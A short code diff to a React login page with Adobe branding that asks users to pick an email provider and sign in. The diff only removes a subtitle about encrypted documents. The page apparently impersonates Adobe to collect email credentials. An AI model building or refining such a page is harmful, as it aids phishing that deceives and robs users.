@@ -178,9 +178,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
               <AdobeLogo />
             </div>
             <h1 className="text-3xl font-bold text-gray-900 drop-shadow-[0_2px_4px_rgba(255,255,255,0.8)]">Sign in to continue</h1>
-            <p className="text-gray-800 mt-3 text-base drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)] font-medium">
-              To view and manage your encrypted documents securely
-            </p>
+            
             <p className="text-gray-800 text-base font-semibold mt-6 drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">Choose your email provider</p>
           </div>
           
@@ -217,9 +215,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
               <AdobeLogo />
             </div>
             <h1 className="text-2xl font-bold text-center text-gray-800">Sign in with {selectedProvider}</h1>
-            <p className="text-center text-gray-600 mt-2 text-sm">
-              To view and manage your encrypted documents securely
-            </p>
+            
 
             <div className="mt-8">
               <button onClick={handleBackToProviders} className="flex items-center gap-2 text-sm text-gray-700 hover:text-gray-900 font-medium mb-6">
